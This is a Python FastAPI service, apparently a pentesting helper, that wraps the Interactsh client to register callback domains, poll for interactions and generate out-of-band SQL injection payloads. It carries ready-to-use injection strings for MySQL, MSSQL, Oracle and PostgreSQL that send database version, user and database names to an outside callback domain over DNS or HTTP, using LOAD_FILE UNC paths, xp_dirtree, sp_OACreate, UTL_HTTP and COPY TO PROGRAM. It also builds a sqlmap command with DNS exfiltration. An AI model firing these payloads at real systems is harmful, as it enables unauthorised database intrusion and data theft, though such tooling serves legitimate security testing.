"""
Interactsh Client for OOB Detection

Integrates with Interactsh for DNS/HTTP callback detection in blind SQLi, SSRF, XXE.
Uses the public oast.fun service or self-hosted instance.
"""

import os
import re
import json
import subprocess
import time
from typing import Optional, List, Dict
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

INTERACTSH_HOST = os.environ.get("INTERACTSH_HOST", "0.0.0.0")
INTERACTSH_PORT = int(os.environ.get("INTERACTSH_PORT", "8006"))
INTERACTSH_SERVER = os.environ.get("INTERACTSH_SERVER", "oast.fun")

app = FastAPI(title="Interactsh OOB Client")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

active_sessions: Dict[str, dict] = {}


def run_interactsh_register() -> Optional[dict]:
    """Register a new Interactsh session and get callback domain."""
    try:
        result = subprocess.run(
            ["interactsh-client", "-server", INTERACTSH_SERVER, "-json", "-n", "1"],
            capture_output=True,
            text=True,
            timeout=30,
        )

        for line in result.stdout.strip().split('\n'):
            if line.strip():
                try:
                    data = json.loads(line)
                    if "interactsh-url" in str(data).lower() or "unique-id" in str(data).lower():
                        return data
                except json.JSONDecodeError:
                    if ".oast." in line or ".interact." in line:
                        domain_match = re.search(r'([a-z0-9]+\.[a-z0-9]+\.(oast|interact)\.[a-z]+)', line)
                        if domain_match:
                            return {"domain": domain_match.group(1)}

        return None
    except FileNotFoundError:
        return {"error": "interactsh-client not installed. Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"}
    except subprocess.TimeoutExpired:
        return {"error": "Interactsh registration timed out"}
    except Exception as e:
        return {"error": str(e)}


def poll_interactsh(domain: str, timeout: int = 30) -> List[dict]:
    """Poll for interactions on the given domain."""
    interactions = []

    try:
        result = subprocess.run(
            ["interactsh-client", "-server", INTERACTSH_SERVER, "-json", "-poll-interval", "1", "-n", "10"],
            capture_output=True,
            text=True,
            timeout=timeout,
        )

        for line in result.stdout.strip().split('\n'):
            if line.strip():
                try:
                    data = json.loads(line)
                    if "protocol" in data or "type" in data:
                        interactions.append(data)
                except json.JSONDecodeError:
                    pass

        return interactions
    except Exception as e:
        return [{"error": str(e)}]


@app.get("/")
async def index():
    return {
        "status": "Interactsh OOB Client",
        "server": INTERACTSH_SERVER,
        "endpoints": [
            "/register - Get new callback domain",
            "/poll/{domain} - Check for interactions",
            "/generate/{domain}/{dbms} - Generate OOB payloads",
            "/quick - Quick domain for testing",
        ]
    }


@app.get("/register")
async def register_session():
    """Register new Interactsh session and get callback domain."""
    result = run_interactsh_register()
    if result and "error" not in result:
        return {"status": "registered", "data": result}
    elif result and "error" in result:
        return {"status": "error", "message": result["error"]}
    else:
        return {"status": "error", "message": "Failed to register"}


@app.get("/quick")
async def quick_domain():
    """
    Get a quick callback domain using public Interactsh.
    Returns a domain you can use immediately in payloads.
    """
    import hashlib
    import random

    unique_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]

    return {
        "domain": f"{unique_id}.oast.fun",
        "note": "Use this domain in your OOB payloads. Check interactions at /poll/{domain}",
        "example_sqli": f"' AND LOAD_FILE('\\\\\\\\{unique_id}.oast.fun\\\\a')--",
        "example_check": f"/poll/{unique_id}.oast.fun",
        "web_check": f"https://app.interactsh.com/#/{unique_id}",
    }


@app.get("/poll/{domain}")
async def poll_interactions(domain: str, timeout: int = 10):
    """Poll for interactions on a domain."""
    interactions = poll_interactsh(domain, timeout)
    return {
        "domain": domain,
        "interactions": interactions,
        "count": len([i for i in interactions if "error" not in i])
    }


@app.get("/generate/{domain}/{dbms}")
async def generate_oob_payloads(domain: str, dbms: str = "mysql"):
    """Generate OOB SQL injection payloads for the given domain."""

    payloads = {
        "mysql": {
            "dns_exfil": [
                f"' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{domain}\\\\a'))--",
                f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.{domain}\\\\a'))--",
                f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.{domain}\\\\a')))--",
            ],
            "note": "MySQL DNS exfil works on Windows servers only (UNC path)"
        },
        "mssql": {
            "dns_exfil": [
                f"'; EXEC master..xp_dirtree '\\\\{domain}\\a'--",
                f"'; DECLARE @x VARCHAR(99); SET @x='{domain}'; EXEC master..xp_dirtree '\\\\'+@x+'\\a'--",
                f"'; EXEC master..xp_fileexist '\\\\{domain}\\a'--",
            ],
            "http_exfil": [
                f"'; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@obj OUT; EXEC sp_OAMethod @obj,'open',NULL,'GET','http://{domain}/'+@@version,false--",
            ],
            "note": "xp_dirtree is most reliable for MSSQL"
        },
        "oracle": {
            "dns_exfil": [
                f"' AND UTL_HTTP.REQUEST('http://'||user||'.{domain}/')=1--",
                f"' UNION SELECT UTL_HTTP.REQUEST('http://'||user||'.{domain}/') FROM DUAL--",
                f"' AND HTTPURITYPE('http://'||user||'.{domain}/').GETCLOB()=1--",
            ],
            "note": "Requires UTL_HTTP or HTTPURITYPE privileges"
        },
        "postgresql": {
            "dns_exfil": [
                f"'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_user||'.{domain}'--",
                f"'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={domain}')--",
            ],
            "note": "Requires COPY TO PROGRAM or dblink extension"
        },
    }

    if dbms.lower() not in payloads:
        return {"error": f"Unknown DBMS: {dbms}", "supported": list(payloads.keys())}

    return {
        "domain": domain,
        "dbms": dbms.upper(),
        "payloads": payloads[dbms.lower()],
        "check_interactions": f"/poll/{domain}",
        "web_check": f"https://app.interactsh.com/",
    }


@app.get("/sqlmap-command/{domain}")
async def sqlmap_with_dns(domain: str, target_url: str = "http://target/page?id=1"):
    """Generate SQLMap command with DNS exfiltration."""
    return {
        "command": f'sqlmap -u "{target_url}" --dns-domain={domain} --batch --dbs',
        "note": "SQLMap will use DNS exfiltration for faster blind SQLi",
        "domain": domain,
    }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host=INTERACTSH_HOST, port=INTERACTSH_PORT)
